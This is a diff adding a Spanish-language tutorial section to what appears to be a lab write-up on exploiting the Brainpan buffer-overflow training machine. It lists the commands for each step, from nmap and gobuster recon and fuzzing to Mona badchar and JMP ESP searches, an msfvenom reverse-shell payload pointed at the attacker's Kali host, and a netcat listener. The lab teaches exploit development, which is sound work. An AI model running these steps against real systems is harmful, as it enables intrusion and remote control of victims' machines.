@@ -93,7 +93,77 @@ A pesar de que el Buffer Overflow es un concepto de software, para realizar su  
 <h2 align="center">Ejemplos de uso</h2>
 
 <p>
-  
+  A continuacion, se presentan los principales comandos utilizados durante el proceso de explotación del buffer overflow, explicando su propósito y el momento específico en que se aplican.
+  <ul>
+    <li><strong>El descubrimiento y la preparación del objetivo.</strong><br>
+      Estos comandos son utilizados al comienzo del proceso, con el objetivo de identificar la máquina víctima y descubrir los servicios potencialmente vulnerables.
+    </li>
+      <ul>
+        <li><strong>Identificación de IP y Puertos.</strong><br></li>
+          <ul>
+            <li><pre><code>arp-scan -I eth0 --localnet</code></pre>
+              Realiza un escaneo de la red local para detectar todas las direcciones IP activas. Muestra las IP asignadas a Windows 7 y Kali Linux</li>
+            <li><pre><code>nmap -p- -open T5 -v -n &lt;dirección ip destino&gt;</code></pre>
+              Escanea todos los puertos de la máquina objetivo. Aca se detecta que el puerto 9999 es en el que se ejecuta brainpan.exe.
+            </li>
+          </ul>
+        <li><strong>Fuzzing Web.</strong><br></li>
+          <ul>
+            <li><pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://&lt;ip linux&gt;:10000/</code></pre>
+              Se utiliza la herramienta gobuster para buscar las rutas ocultas en el servidor web. Esto, permite descubrir el directorio /bin/, donde se puede acceder y descargar el ejecutable brainpan.exe.</li>
+          </ul>        
+      </ul>
+     <li><strong>La fase de fuzzing y la determinación del offset.</strong><br>
+     Estos comandos permiten verificar si el programa es vulnerable y determinar cuántos bytes se necesitan para sobrescribir el EIP.</li>
+       <ul>
+         <li><strong>Fuzzing Básico con Netcat</strong></li>
+           <ul>
+            <li><pre><code>nc &lt;ip windows&gt; 9999</code></pre>
+              Se conecta al brainpan en ejecución utilizando el netcat y se continúa con una cadena de caracteres de gran longitud</li>
+           </ul>
+         <li><strong>Generación de Patrón para Calcular Offset</strong></li>
+           <ul>
+            <li><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</code></pre>
+              Genera una cadena única de 1000 caracteres. La cual se envía al programa para provocar un crash que permitirá localizar exactamente dónde se sobrescribe el EIP.</li>
+           </ul>
+         <li><strong>Cálculo del Offset</strong></li>
+           <ul>
+            <li><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q &lt;valor EIP&gt;</code></pre>
+              Toma el valor hexadecimal del EIP mostrado en el crash y calcula cuántos bytes exactos se necesitan para llegar a él. Sobrescribe el EIP.</li>
+           </ul>
+       </ul>
+     <li><strong>La explotación avanzada y la generación de shellcode.</strong><br></li>
+    Una vez controlado el EIP, estos comandos permiten detectar los caracteres problemáticos, encontrar la dirección de salto, generar el shellcode y lanzar el exploit final.
+       <ul>
+         <li><strong>Configuración de Mona.py</strong></li>
+           <ul>
+            <li><pre><code>!mona config -set workingfolder C:\Users\computador1\Desktop\%p</code></pre>
+              Crea un directorio de trabajo para Mona, para guardar los logs, los archivos bytearray y las comparaciones.</li>
+           </ul>
+         <li><strong>Generación de bytearray para identificar los badchars</strong></li>
+           <ul>
+            <li><pre><code>!mona bytearray -cpb "\x00"</code></pre>
+              Crea una lista de todos los bytes posibles (excepto los conocidos como problemáticos o bachar como lo es el byte nulo). Esta lista se guarda en un archivo y se envía al programa para observar cuáles se corrompen en la pila.</li>
+            <li><pre><code>!mona compare -f C:\Users\computador1\Desktop\_no_name\bytearray.txt</code></pre>
+              Compara el contenido de la pila con la lista de badchars original e identifica los badchars adicionales que deben ser excluidos al generar el shellcode.</li>
+           </ul>
+         <li><strong>Búsqueda de la dirección JMP ESP</strong></li>
+           <ul>
+            <li><pre><code>!monafind -s “\xFF\xE4” -m brainpan.exe</code></pre>
+              Busca la dirección generada que contenga la instrucción JMP ESP, luego esta dirección será usada para redirigir el flujo hacia el shellcode.</li>
+           </ul>
+         <li><strong>Generación del shellcode (msfvenom)</strong></li>
+           <ul>
+            <li><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip kali&gt; LPORT=443 --platform windows -a x86 -f c -b '\x00' EXITFUNC=thread</code></pre>
+              Genera un shellcode que abre una conexión inversa desde la máquina víctima hacia Kali.</li>
+           </ul>
+         <li><strong>Configuración del listener (Netcat o Metasploit)</strong></li>
+           <ul>
+            <li><pre><code>nc -lvnp 443</code></pre>
+              Inicia un listener en Kali para esperar la conexión entrante desde la máquina víctima. Si el exploit es exitoso, se obtiene una shell de la máquina comprometida.</li>
+          </ul>
+       </ul>
+   </ul>
 </p>
 
 <h2 align="center">Créditos de autores</h2>
